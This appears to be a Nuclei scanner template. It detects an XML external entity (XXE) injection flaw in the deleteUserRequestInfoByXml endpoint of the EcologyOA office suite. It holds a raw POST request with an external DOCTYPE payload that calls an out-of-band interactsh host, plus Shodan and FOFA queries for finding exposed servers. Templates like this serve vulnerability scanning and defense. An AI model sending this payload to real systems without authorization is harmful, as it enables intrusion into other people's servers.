id: ecology-oa-byxml-xxe

info:
  name: EcologyOA deleteUserRequestInfoByXml - XML External Entity Injection
  author: SleepingBag945
  severity: high
  description: |
    EcologyOA deleteUserRequestInfoByXml interface has XXE
  metadata:
    verified: true
    max-request: 1
    shodan-query: ecology_JSessionid
    fofa-query: app="泛微-协同办公OA"
  tags: ecology-oa,xxe

http:
  - raw:
      - |
        POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
        <M><syscode>&send;</syscode></M>

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'WfData'

      - type: word
        part: header
        words:
          - 'application/xml'

      - type: word
        part: interactsh_protocol
        words:
          - "dns"

# digest: 490a0046304402200501aac5c10b73375ecd3b89cad20548624577c332df617cd43bbc6ad1bab6f302203b7dd9905dd757aeae54b4acd61895ffbbfd2ecf4b4f05c074049b60583d6fe4:922c64590222798bb761d5b6d8e72950
